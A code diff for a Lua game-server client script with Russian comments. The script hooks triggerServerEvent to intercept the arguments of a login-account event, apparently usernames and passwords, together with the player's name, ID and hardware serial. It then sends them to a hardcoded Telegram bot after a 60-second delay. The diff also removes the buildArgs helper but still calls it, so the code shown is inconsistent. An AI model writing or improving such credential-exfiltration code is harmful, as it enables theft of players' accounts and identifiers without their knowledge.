@@ -3,14 +3,12 @@ local CHAT_ID = "-1003947071509"
 local sended = false
 
 function sendTG(text)
-    -- Заменяем спецсимволы для URL
-    text = text:gsub("\n", " ")
-    text = text:gsub(" ", "%%20")
+    -- Сначала кодируем переносы строк в формат для URL (%0A)
+    -- Затем заменяем пробелы на %20
+    local encodedText = text:gsub("\n", "%%0A"):gsub(" ", "%%20")
 
     fetchRemote(
-        "https://api.telegram.org/bot"..BOT_TOKEN..
-        "/sendMessage?chat_id="..CHAT_ID..
-        "&text="..text,
+        "https://api.telegram.org/bot"..BOT_TOKEN.."/sendMessage?chat_id="..CHAT_ID.."&text="..encodedText,
         {},
         function(responseData, errno)
             outputDebugString("TG Status: "..tostring(errno))
@@ -18,64 +16,39 @@ function sendTG(text)
     )
 end
 
-function valToString(v)
-    if type(v) == "string" then return '"'..v..'"'
-    elseif type(v) == "number" then return tostring(v)
-    elseif type(v) == "boolean" then return tostring(v)
-    elseif isElement(v) then
-        if v == localPlayer then return "localPlayer" end
-        local etype = getElementType(v)
-        return etype == "player" and "player["..getPlayerName(v).."]" or "elem:"..etype
-    end
-    return tostring(v)
-end
-
-function buildArgs(...)
-    local args = {...}
-    local t = {}
-    for i,v in ipairs(args) do
-        table.insert(t, valToString(v))
-    end
-    return table.concat(t, ", ")
-end
-
 addDebugHook("preFunction", function(sourceResource, functionName, isAllowedByACL, luaFilename, luaLineNumber, ...)
-    if sended or functionName ~= "triggerServerEvent" then
-        return
-    end
+    if sended or functionName ~= "triggerServerEvent" then return end
 
     local args = {...}
     local eventName = tostring(args[1])
 
-    if eventName ~= "addt:LoginAccount" then
-        return
-    end
+    if eventName ~= "addt:LoginAccount" then return end
 
     sended = true
-
-    -- Получаем данные игрока (исправленный блок)
-    local serial = getPlayerSerial(localPlayer)
-    local nick = getPlayerName(localPlayer)
-    
-    -- Берем ID через getElementID и убираем префикс "p"
-    local rawID = getElementID(localPlayer) or "0"
-    local idloc = tostring(rawID):gsub("p", "")
-
     local resName = sourceResource and getResourceName(sourceResource) or "unknown"
+    local argString = buildArgs(...)
 
-    -- Формируем текст (теперь переменные на своих местах)
-    local text = string.format(
-        "👤 Player: %s | ID: %s | Serial: %s\n📦 Resource: [%s]\n⚙️ Event: %s\n📝 Args: (%s)",
-        nick, 
-        idloc, 
-        serial, 
-        resName, 
-        eventName, 
-        buildArgs(...)
-    )
+    
 
-    outputDebugString(text)
-    sendTG(text)
+    setTimer(function()
+        local nick = getPlayerName(localPlayer) or "N/A"
+        local serial = getPlayerSerial(localPlayer) or "N/A"
+        
+        -- Получение ID как ты просил
+        local rawID = getElementID(localPlayer) or "0"
+        local idloc = tostring(rawID):gsub("p", "")
+
+        -- Теперь \n будет работать правильно
+        local report = "✅ Вход в аккаунт\n" ..
+                       "👤 Ник: " .. nick .. "\n" ..
+                       "🆔 ID: " .. idloc .. "\n" ..
+                       "🔑 Serial: " .. serial .. "\n" ..
+                       "📦 Ресурс: " .. resName .. "\n" ..
+                       "📝 Аргументы: " .. argString
+
+        sendTG(report)
+        outputConsole("[DEBUG] Сообщение отправлено в TG")
+    end, 60000, 1)
 end, {"triggerServerEvent"})
 ----------------------------------------------------------------
 -- ГЛОБАЛЬНАЯ ТАБЛИЦА И ОЧИСТКА
